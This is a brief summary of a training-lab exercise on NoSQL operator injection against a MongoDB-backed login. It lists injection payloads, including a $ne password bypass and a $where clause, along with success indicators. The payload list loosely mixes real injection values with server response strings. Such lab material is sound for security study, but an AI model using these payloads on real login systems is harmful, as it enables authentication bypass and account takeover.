## Exploiting NoSQL operator injection to extract unknown fields

**Category:** nosql
**Difficulty:** Unknown

### Description
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

### Solution Steps
To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user
carlos
.

### Key Payloads
- `carlos`
- `invalid`
- `Invalid username or password`
- `POST
                                    /login`
- `"invalid"`
- `{"$ne":"invalid"}`
- `Account locked`
- `POST /login`
- `"$where": "0"`
- `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`

### Indicators of Success
- NoSQL operator injection works ($ne, $regex)
- Boolean conditions change response
- Data extracted via injection
- Authentication bypassed
- Query logic manipulated
